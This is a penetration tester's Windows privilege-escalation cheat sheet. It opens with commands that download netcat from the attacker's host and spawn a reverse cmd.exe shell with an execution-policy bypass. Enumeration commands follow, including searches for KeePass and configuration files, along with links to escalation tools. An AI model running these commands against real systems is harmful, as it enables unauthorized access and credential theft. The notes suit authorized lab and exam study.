# Methodology

**Note:** Commands that have equivalents for both CMD and PowerShell will be separated with `---`, with the CMD command first, followed by their PowerShell equivalents.

## Establish Peristence

```powershell
# Establish a working environment to drop files into
C:\ProgramData
C:\Users\Public
C:\Temp

# Upgrade the current shell
iwr -uri $OUR_IP/nc.exe -outfile nc.exe
rlwrap -crA nc -lvnp 9002 # On kali box
.\nc.exe $OUR_IP 9002 -e cmd.exe
powershell -ep bypass
```

## Enumeration

```powershell
# Check privileges
whoami /all

# Check local users/groups
net user --- Get-LocalUser
net user $USER
net localgroup --- Get-LocalGroup

# Check local group memberships
net localgroup $GROUP --- Get-LocalGroupMember $GROUP

# Gather system information
systeminfo              # Check "OS Name", "OS Version", "System Type"

# Gather network information
netstat -ano            # Look for new available ports
Get-Process -Id $PID    # Check the process associated with a PID
ipconfig /all           # Check "Physical Address", "DHCP Enabled", "IPv4 Address", "Default Gateway", and "DNS Servers"
route print             # Look for attack vectors to other systems or networks

# Check installed applications
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select DisplayName, DisplayVersion
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select DisplayName, DisplayVersion

# Check dotnet version
Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -Recurse | Get-ItemProperty -Name Version,Release -ErrorAction 0 | Where { $_.PSChildName -match '^(?!S)\p{L}'} | Select PSChildName, Version, Release

# Check running processes
Get-Process | Sort-Object Id
Get-Process | Select-Object Id, ProcessName, Path | Sort-Object Id

# Enumerate user directories
tree C:\Users /a /f
Get-ChildItem -Path C:\Users\$USER\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue

# Check file permissions
icacls $TARGET /c

# Search for sensitive files
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue              # KeePass database files
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue    # my.ini is the configuration file for MySQL

# Check command history
Get-History
(Get-PSReadlineOption).HistorySavePath

# Check services
Get-CimInstance -ClassName win32_service | Select ProcessId, Name, State, PathName | Sort-Object ProcessId | Where-Object {$_.State -like 'Running'}
Get-CimInstance -ClassName win32_service | Sort-Object ProcessId
Get-CimInstance -ClassName win32_service | Where-Object {$_.Name -like '$SERVICE_NAME'}

# Manage services
Restart-Service $SERVICE_NAME
net stop $SERVICE_NAME --- Stop-Service $SERVICE_NAME
net start $SERVICE_NAME --- Start-Service $SERVICE_NAME

# Check path environment variable
$env:path

# Check scheduled tasks
schtasks /query /fo LIST /v > tasks.txt
dos2unix tasks.txt     # On kali
less tasks.txt         # On kali, search for tasks owned by privileged accounts. Check "TaskName", "Next Run Time", "Author", and "Task To Run"
```

## Tools

**Primary:**

1. [SharpUp](Tools/SharpUp.md)
2. [winPEAS](https://github.com/carlospolop/PEASS-ng/releases/)
3. [Seatbelt](Tools/Seatbelt.md)

**Backup:**

- [PowerUp](Tools/PowerUp.md)

### Misc

```powershell
# Check for defender
Get-MpPreference

# Stop processes
Get-Process $PROCESS_NAME | Stop-Process
Get-Process | Where-Object { $_.ProcessName -like '*$PROCESS_NAME*' } | Stop-Process

# Open explorer in the current directory
Invoke-Item .


# Check inbound/outbound firewall rules
netsh advfirewall firewall show rule name=all dir=in
netsh advfirewall firewall show rule name=all dir=out

# Check ARP table
arp -a

# Check environment variables
Get-ChildItem env:

# List permissions
Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl
Get-Acl Microsoft | Select-Object -ExpandProperty Owner

# Query registry key
reg query "HKLM\SOFTWARE\Key" /s
reg query "HKLM\SOFTWARE\Key" /v EncKey
```

**Notable Groups:**

```bash
Administrators             # Full control
Remote Desktop Users       # Remote access via RDP
Remote Management Users    # Remote access via WinRM
```

`icacls` permissions mask table (ACE = access control entry)

- `F` - Full access
- `M` - Modify access
- `RX` - Read and execute access
- `R` - Read-only access
- `W` - Write-only access

Inheritance rights ([MSDN](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/icacls))

- `I` - Inherit. ACE inherited from the parent container
- `OI` - Object inherit. Objects in this container will inherit this ACE. Applies only to directories.
- `CI` - Container inherit. Containers in this parent container will inherit this ACE. Applies only to directories.
- `IO` - Inherit only. ACE inherited from the parent container, but does not apply to the object itself. Applies only to directories.
- `NP` - Do not propagate inherit. ACE inherited by containers and objects from the parent container, but does not propagate to nested containers. Applies only to directories.

**Role is `nt authority\local service` without `SeImpersonatePrivilege` present:**

Commonly the role for a web server running on a windows computer (such as `xampp`)

[FullPowers](https://github.com/itm4n/FullPowers)

```powershell
.\FullPowers.exe
```
